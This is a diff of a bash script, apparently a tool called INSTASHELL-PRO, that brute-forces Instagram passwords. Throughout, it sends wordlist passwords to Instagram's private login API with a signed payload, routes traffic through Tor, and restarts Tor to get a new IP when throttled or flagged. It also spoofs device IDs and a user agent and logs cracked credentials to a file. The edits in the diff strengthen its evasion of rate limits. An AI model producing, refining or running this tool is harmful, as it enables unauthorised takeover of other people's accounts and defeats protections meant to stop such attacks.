@@ -1,6 +1,6 @@
 #!/bin/bash
-# INSTASHELL-PRO | CUSTOM VERSION FOR KHALID HUSAIN
-# UPDATED: JAN 2026 - SECURITY BYPASS ENABLED
+# KHALID HUSAIN | INSTASHELL-PRO 2026 STABLE
+# FIXED: Invalid_User loops & Modern Signature Verification
 
 trap 'exit 1' 2
 
@@ -14,80 +14,74 @@ banner() {
     printf "  ██║  ██╗██║  ██║██║  ██║███████╗██║██████╔╝\n"
     printf "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ \n"
     printf "       \e[1;93mH  U  S  A  I  N    7  8  6\e[0m\n"
-    printf "\e[1;77m\e[45m    AUTHORIZED BY: KHALID HUSAIN (2026)    \e[0m\n\n"
+    printf "\e[1;77m\e[45m    2026 RE-ENGINEERED BY: KHALID HUSAIN    \e[0m\n\n"
 }
 
-get_token() {
-    uuid=$(openssl rand -hex 16)
-    token=$(curl -s -i "https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=$uuid" | grep -i "set-cookie: csrftoken=" | cut -d "=" -f2 | cut -d ";" -f1)
-    echo "$token"
+# AUTO-REFRESH IP ON BLOCK
+refresh_ip() {
+    printf "\e[1;91m[!] Flagged. Refreshing IP...\e[0m\n"
+    sudo service tor restart > /dev/null 2>&1
+    sleep 10
 }
 
 start() {
     banner
     if ! pgrep -x "tor" > /dev/null; then
-        printf "\e[1;91m[!] ERROR: Tor is not running! Run: sudo service tor start\e[0m\n"
-        exit 1
+        printf "\e[1;91m[!] Tor is OFF. Starting it for you...\e[0m\n"
+        sudo service tor start && sleep 5
     fi
 
     read -p $'\e[1;92mUsername account: \e[0m' user
-    user=$(echo "$user" | tr -d ' ') # FIX: Strips spaces to prevent [INVALID USER]
+    # FIX: Force lowercase and strip all spaces
+    user=$(echo "$user" | tr '[:upper:]' '[:lower:]' | tr -d ' ')
     
-    read -p $'\e[1;92mPassword List (Default: passwords.lst): \e[0m' wl_pass
+    read -p $'\e[1;92mPassword List: \e[0m' wl_pass
     wl_pass="${wl_pass:-passwords.lst}"
-    
-    if [[ ! -f "$wl_pass" ]]; then 
-        printf "\e[1;91m[!] Error: File $wl_pass not found!\e[0m\n"
-        exit 1
-    fi
 }
 
 bruteforcer() {
-    csrftoken=$(get_token)
-    [ -z "$csrftoken" ] && csrftoken="missing"
-    printf "\e[1;92m[*] Target: $user | Wordlist: $wl_pass\e[0m\n\n"
+    printf "\e[1;92m[*] Monitoring target: $user...\e[0m\n\n"
     
     while IFS= read -r pass || [ -n "$pass" ]; do
         pass=$(echo "$pass" | tr -d '\r' | xargs)
-        if [[ -z "$pass" ]]; then continue; fi
+        [ -z "$pass" ] && continue
 
+        # GENERATE SESSION DATA
         guid=$(openssl rand -hex 16)
         device="android-$(openssl rand -hex 8)"
-        timestamp=$(date +%s)
+        ts=$(date +%s)
         
-        # MODERN PAYLOAD: Includes enc_password version 0 for 2026 compatibility
-        data="{\"phone_id\":\"$guid\", \"_csrftoken\":\"$csrftoken\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"enc_password\":\"#PWD_INSTAGRAM_BROWSER:0:$timestamp:$pass\", \"login_attempt_count\":\"0\"}"
+        # 2026 PAYLOAD: VERSION 0 ENCRYPTION
+        data="{\"phone_id\":\"$guid\", \"username\":\"$user\", \"guid\":\"$guid\", \"device_id\":\"$device\", \"enc_password\":\"#PWD_INSTAGRAM_BROWSER:0:$ts:$pass\", \"login_attempt_count\":\"0\"}"
         sig="4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178"
         hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "$sig" | cut -d " " -f2)
 
         printf "\e[1;77mTesting: %-20s \e[0m" "$pass"
 
-        # FRESH AGENT: Google Pixel 9 Pro (Android 15)
+        # MODERN 2026 USER-AGENT (Android 15)
         response=$(curl --socks5-hostname 127.0.0.1:9050 -s \
-            -A "Instagram 325.0.0.45.110 Android (35/15; 480dpi; 1080x2400; Google; Pixel 9 Pro; panther; google; en_US; 580123951)" \
+            -A "Instagram 325.0.0.45.110 Android (35/15; 480dpi; Google; Pixel 9 Pro)" \
             -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
             -d "ig_sig_key_version=4&signed_body=$hmac.$data" \
             "https://i.instagram.com/api/v1/accounts/login/")
 
+        # LOGIC HANDLER
         if [[ $response == *"logged_in_user"* ]]; then
-            printf "\e[1;92m[FOUND!]\e[0m\n"
-            echo "SUCCESS: $user : $pass" >> found.txt
-            exit 0
+            printf "\e[1;92m[SUCCESS!]\e[0m\n"
+            echo "$user:$pass" >> found.txt && exit 0
         elif [[ $response == *"invalid_user"* ]]; then
-            printf "\e[1;91m[INVALID USER]\e[0m\n"
+            printf "\e[1;91m[IP REJECTED]\e[0m\n"
+            refresh_ip # Immediately change IP if flagged
         elif [[ $response == *"challenge"* ]]; then
-            printf "\e[1;93m[CHALLENGE]\e[0m\n"
-            echo "CHALLENGE REQUIRED FOR: $pass" >> found.txt
-            exit 0
+            printf "\e[1;93m[2FA REQUIRED]\e[0m\n"
+            echo "2FA: $pass" >> found.txt && exit 0
         elif [[ $response == *"Please wait"* ]]; then
-            printf "\e[1;91m[LIMIT HIT]\e[0m\n"
-            killall -HUP tor 2>/dev/null && sleep 5
+            printf "\e[1;91m[THROTTLED]\e[0m\n"
+            refresh_ip
         else
             printf "\e[1;90m[WRONG]\e[0m\n"
         fi
-        
-        # Anti-Detection Random Sleep
-        sleep $(( ( RANDOM % 2 )  + 1 ))
+        sleep $(( ( RANDOM % 3 ) + 2 ))
     done < "$wl_pass"
 }
 
